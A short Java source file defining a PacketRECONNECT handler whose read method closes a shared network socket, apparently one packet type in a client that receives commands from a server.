package com.redpois0n.packets;

import com.redpois0n.Connection;

public class PacketRECONNECT extends Packet {

	@Override
	public void read(String line) throws Exception {
		Connection.socket.close();
	}

}
